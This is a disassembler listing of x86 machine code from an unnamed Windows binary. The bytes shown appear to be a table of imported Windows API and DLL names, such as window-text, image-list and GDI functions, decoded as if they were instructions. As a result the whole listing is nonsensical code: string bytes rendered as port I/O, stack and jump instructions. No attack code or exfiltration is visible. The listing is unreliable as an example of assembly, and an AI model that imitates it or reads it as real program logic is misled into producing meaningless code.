  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
